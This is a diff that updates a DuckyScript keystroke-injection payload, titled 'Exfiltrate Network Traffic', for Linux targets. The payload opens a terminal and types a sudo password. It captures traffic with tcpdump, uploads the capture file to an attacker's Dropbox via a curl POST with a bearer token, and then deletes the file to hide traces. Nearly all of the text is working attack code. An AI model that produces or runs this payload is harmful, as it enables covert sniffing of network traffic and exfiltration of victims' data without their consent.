@@ -1,57 +1,76 @@
-
-REM #############################################
-REM #                                           |
-REM # Title        : Exfiltrate Network Traffic |
-REM # Author       : Aleff                      |
-REM # Version      : 1.0                        |
-REM # Category     : Exfiltration               |
-REM # Target       : Linux                      |
-REM #                                           |
-REM #############################################
+REM_BLOCK
+#############################################
+#                                           #
+# Title        : Exfiltrate Network Traffic #
+# Author       : Aleff                      #
+# Version      : 1.0                        #
+# Category     : Exfiltration               #
+# Target       : Linux                      #
+#                                           #
+#############################################
+END_REM
 
 REM Requirements:
 REM     - Permissions
 REM     - Internet Connection
 
 REM REQUIRED: You need to know the sudo password and replace 'example' with this
-DEFINE SUDO_PASS example
+DEFINE #SUDO_PASS example
+
 REM REQUIRED: Set what you want to sniff, for example tcp port 80
-DEFINE SNIFFING example
+DEFINE #SNIFFING example
+
 REM Set your Dropbox link or whatever you want to use to exfiltrate the sniff file
-DEFINE TOKEN example
+DEFINE #TOKEN example
+
 REM Just a Dropbox const
-DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
+DEFINE #DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
+
 REM Output file path packets.pcap, remember to use pcap extension
-DEFINE FILE example.pcap
+DEFINE #FILE example.pcap
 
+EXTENSION DETECT_READY
+    REM VERSION 1.1
+    REM AUTHOR: Korben
 
-DELAY 1000
+    REM_BLOCK DOCUMENTATION
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+
+        TARGETS:
+            Any system that reflects CAPSLOCK will detect minimum required delay
+            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #RESPONSE_DELAY 25
+    DEFINE #ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY #RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
 CTRL-ALT t
 DELAY 2000
 
-
 REM #### PERMISSIONS SECTION ####
-
-
 STRINGLN sudo su
 DELAY 1000
-STRINGLN SUDO_PASS
+STRINGLN #SUDO_PASS
 DELAY 1000
 
-
 REM #### Network Traffic SECTION ####
-
-
-STRING FILE_PATH="
-STRING FILE
-STRING "
-ENTER
+STRINGLN FILE_PATH="#FILE"
 DELAY 500
 
-STRING filter_expression="
-STRING SNIFFING
-STRING "
-ENTER
+STRINGLN filter_expression="#SNIFFING"
 DELAY 500
 
 REM Network card name
@@ -71,28 +90,18 @@ DELAY 60000
 REM Kill the process by PID
 STRINGLN kill $tcpdump_pid
 
-
 REM #### Exfiltrate SECTION ####
 REM You can use whatever you want, i use Dropbox
 
-STRING ACCESS_TOKEN="
-STRING TOKEN
-STRING "
-ENTER
+STRINGLN ACCESS_TOKEN="#TOKEN"
 DELAY 500
 
 STRINGLN DROPBOX_FOLDER="/Exfiltration"
 DELAY 500
 
-STRING curl -X POST
-STRING DROPBOX_API_CONST
-STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$FILE_PATH"
-ENTER
-
+STRINGLN curl -X POST#DROPBOX_API_CONST--header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$FILE_PATH"
 
 REM #### REMOVE TRACES ####
-
-
 STRINGLN rm "$FILE_PATH"
 DELAY 500
 
